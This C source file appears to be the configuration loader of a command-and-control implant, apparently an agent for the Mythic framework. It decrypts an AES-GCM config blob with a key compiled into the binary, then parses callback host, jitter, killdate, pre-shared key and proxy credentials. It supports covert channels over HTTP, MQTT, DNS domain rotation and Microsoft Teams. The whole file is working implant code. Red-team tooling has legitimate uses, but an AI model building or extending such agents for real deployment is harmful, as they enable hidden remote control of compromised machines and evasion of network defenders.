#include "common.h"
#include "config.h"
#include "crypto.h"
#include "cJSON.h"

static void copy_str(char *dst, size_t cap, const char *src) {
    if (!src)
        src = "";
    strncpy(dst, src, cap - 1);
    dst[cap - 1] = '\0';
}

static const char *json_str(cJSON *obj, const char *key) {
    cJSON *v = cJSON_GetObjectItemCaseSensitive(obj, key);
    if (!v || !cJSON_IsString(v))
        return "";
    return v->valuestring ? v->valuestring : "";
}

static int json_int(cJSON *obj, const char *key, int def) {
    cJSON *v = cJSON_GetObjectItemCaseSensitive(obj, key);
    if (!v || !cJSON_IsNumber(v))
        return def;
    return v->valueint;
}

static int json_str_array(cJSON *obj, const char *key, char *dst, size_t width, int cap) {
    cJSON *arr = cJSON_GetObjectItemCaseSensitive(obj, key);
    cJSON *v;
    int n = 0;
    if (!arr || !cJSON_IsArray(arr))
        return 0;
    for (v = arr->child; v && n < cap; v = v->next) {
        if (!cJSON_IsString(v) || !v->valuestring || v->valuestring[0] == '\0')
            continue;
        strncpy(dst + (size_t)n * width, v->valuestring, width - 1);
        dst[(size_t)n * width + width - 1] = '\0';
        n++;
    }
    return n;
}

int config_load(agent_config_t *out) {
    bytebuf_t ct = {0}, key = {0}, nonce = {0}, pt = {0};
    cJSON *root = NULL, *headers = NULL, *h = NULL;
    int rc = -1;
    memset(out, 0, sizeof(*out));
    if (hex_decode(CFG_BLOB, &ct) != 0)
        goto done;
    if (hex_decode(CFG_KEY, &key) != 0)
        goto done;
    if (hex_decode(CFG_NONCE, &nonce) != 0)
        goto done;
    if (key.len != 32)
        goto done;
    if (gcm_open(key.data, nonce.data, nonce.len, ct.data, ct.len, &pt) != 0)
        goto done;
    root = cJSON_ParseWithLength((const char *)pt.data, pt.len);
    if (!root)
        goto done;
    copy_str(out->payload_uuid, sizeof(out->payload_uuid), json_str(root, "payload_uuid"));
    copy_str(out->callback_host, sizeof(out->callback_host), json_str(root, "callback_host"));
    out->callback_port = json_int(root, "callback_port", 80);
    out->interval = json_int(root, "callback_interval", 10);
    out->jitter = json_int(root, "callback_jitter", 23);
    copy_str(out->post_uri, sizeof(out->post_uri), json_str(root, "post_uri"));
    copy_str(out->proxy_host, sizeof(out->proxy_host), json_str(root, "proxy_host"));
    copy_str(out->proxy_port, sizeof(out->proxy_port), json_str(root, "proxy_port"));
    copy_str(out->proxy_user, sizeof(out->proxy_user), json_str(root, "proxy_user"));
    copy_str(out->proxy_pass, sizeof(out->proxy_pass), json_str(root, "proxy_pass"));
    copy_str(out->killdate, sizeof(out->killdate), json_str(root, "killdate"));
    copy_str(out->crypto, sizeof(out->crypto), json_str(root, "crypto"));
    copy_str(out->psk_b64, sizeof(out->psk_b64), json_str(root, "psk"));
    out->retries = json_int(root, "retries", 3);
    out->tasking_size = json_int(root, "tasking_size", -1);
    copy_str(out->profile, sizeof(out->profile), json_str(root, "profile"));
    copy_str(out->mqtt_server, sizeof(out->mqtt_server), json_str(root, "mqtt_server"));
    copy_str(out->mqtt_port, sizeof(out->mqtt_port), json_str(root, "mqtt_port"));
    copy_str(out->mqtt_use_ssl, sizeof(out->mqtt_use_ssl), json_str(root, "mqtt_use_ssl"));
    copy_str(out->mqtt_client, sizeof(out->mqtt_client), json_str(root, "mqtt_client"));
    copy_str(out->mqtt_user, sizeof(out->mqtt_user), json_str(root, "mqtt_user"));
    copy_str(out->mqtt_pass, sizeof(out->mqtt_pass), json_str(root, "mqtt_pass"));
    copy_str(out->mqtt_topic, sizeof(out->mqtt_topic), json_str(root, "mqtt_topic"));
    copy_str(out->mqtt_mythic, sizeof(out->mqtt_mythic), json_str(root, "mqtt_mythic"));
    copy_str(out->mqtt_taskcheck, sizeof(out->mqtt_taskcheck), json_str(root, "mqtt_taskcheck"));
    out->dns_domain_count = json_str_array(root, "domains", &out->dns_domains[0][0], 256, 4);
    copy_str(out->dns_rotation, sizeof(out->dns_rotation), json_str(root, "domain_rotation"));
    out->dns_failover = json_int(root, "failover_threshold", 5);
    copy_str(out->dns_server, sizeof(out->dns_server), json_str(root, "dns_server"));
    copy_str(out->dns_record, sizeof(out->dns_record), json_str(root, "record_type"));
    out->dns_max_query = json_int(root, "max_query_length", 255);
    out->dns_max_sub = json_int(root, "max_subdomain_length", 64);
    copy_str(out->teams_tenant, sizeof(out->teams_tenant), json_str(root, "tenant_id"));
    copy_str(out->teams_client, sizeof(out->teams_client), json_str(root, "client_id"));
    copy_str(out->teams_secret, sizeof(out->teams_secret), json_str(root, "client_secret"));
    copy_str(out->teams_team, sizeof(out->teams_team), json_str(root, "team_id"));
    copy_str(out->teams_channel, sizeof(out->teams_channel), json_str(root, "channel_id"));
    copy_str(out->teams_webhook, sizeof(out->teams_webhook), json_str(root, "webhook_url"));
    copy_str(out->teams_ua, sizeof(out->teams_ua), json_str(root, "user_agent"));
    headers = cJSON_GetObjectItemCaseSensitive(root, "headers");
    if (headers) {
        for (h = headers->child; h && out->header_count < ERLIKHAN_MAX_HEADERS; h = h->next) {
            if (!h->string || !cJSON_IsString(h) || !h->valuestring || h->valuestring[0] == '\0')
                continue;
            copy_str(out->headers[out->header_count].name,
                     sizeof(out->headers[out->header_count].name), h->string);
            copy_str(out->headers[out->header_count].value,
                     sizeof(out->headers[out->header_count].value), h->valuestring);
            out->header_count++;
        }
    }
    if (out->payload_uuid[0] == '\0')
        goto done;
    if (strcmp(out->crypto, "none") != 0 && strcmp(out->crypto, "aes256_hmac") != 0)
        goto done;
    if (out->profile[0] == '\0' || strcmp(out->profile, "http") == 0) {
        if (out->callback_host[0] == '\0' || out->post_uri[0] == '\0')
            goto done;
    } else if (strcmp(out->profile, "mqtt") == 0) {
        if (out->mqtt_server[0] == '\0' || out->mqtt_topic[0] == '\0' ||
            out->mqtt_mythic[0] == '\0' || out->mqtt_taskcheck[0] == '\0')
            goto done;
    } else if (strcmp(out->profile, "dns") == 0) {
        if (out->dns_domain_count < 1 || out->dns_server[0] == '\0')
            goto done;
    } else if (strcmp(out->profile, "msteams") == 0) {
        if (out->teams_tenant[0] == '\0' || out->teams_client[0] == '\0' ||
            out->teams_secret[0] == '\0' || out->teams_team[0] == '\0' ||
            out->teams_channel[0] == '\0')
            goto done;
    } else {
        goto done;
    }
    rc = 0;
done:
    if (root)
        cJSON_Delete(root);
    bytebuf_free(&ct);
    bytebuf_free(&key);
    bytebuf_free(&nonce);
    bytebuf_free(&pt);
    return rc;
}
